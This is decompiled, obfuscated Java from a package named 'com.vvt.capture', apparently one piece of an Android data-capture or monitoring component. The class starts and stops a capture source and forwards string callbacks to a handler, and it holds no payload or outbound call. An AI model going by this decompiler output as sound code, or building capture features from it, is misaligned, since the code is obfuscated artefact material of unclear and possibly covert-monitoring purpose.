package com.vvt.capture.b.a;

import com.vvt.ak.a;
import com.vvt.base.capture.e;
import com.vvt.base.capture.h;
import com.vvt.base.capture.i;

public class c
  implements e, h
{
  private static final boolean a = a.a;
  private static final boolean b = a.b;
  private d c;
  private i d;
  private boolean e;
  
  public c()
  {
    d locald = d.a();
    this.c = locald;
  }
  
  public void a()
  {
    boolean bool = this.e;
    if (bool)
    {
      i locali = this.d;
      if (locali != null)
      {
        bool = b;
        if (bool) {}
        locali = this.d;
        locali.a();
      }
    }
  }
  
  public void a(i parami)
  {
    boolean bool = a;
    if (bool) {}
    bool = this.e;
    if (!bool)
    {
      bool = true;
      this.e = bool;
      this.d = parami;
      d locald = this.c;
      locald.a(this);
    }
    bool = a;
    if (bool) {}
  }
  
  public void a(String paramString)
  {
    boolean bool = this.e;
    if (bool)
    {
      bool = b;
      if (bool) {}
      i locali = this.d;
      locali.a(paramString);
    }
  }
  
  public void a(String paramString1, String paramString2)
  {
    boolean bool = this.e;
    if (bool)
    {
      bool = b;
      if (bool) {}
      i locali = this.d;
      locali.a(paramString1, paramString2);
    }
  }
  
  public void b()
  {
    boolean bool = a;
    if (bool) {}
    bool = this.e;
    if (bool)
    {
      bool = false;
      this.e = false;
      d locald = this.c;
      if (locald != null)
      {
        locald = this.c;
        locald.b(this);
      }
    }
    bool = a;
    if (bool) {}
  }
  
  public void c() {}
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/removeFromPath/a/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */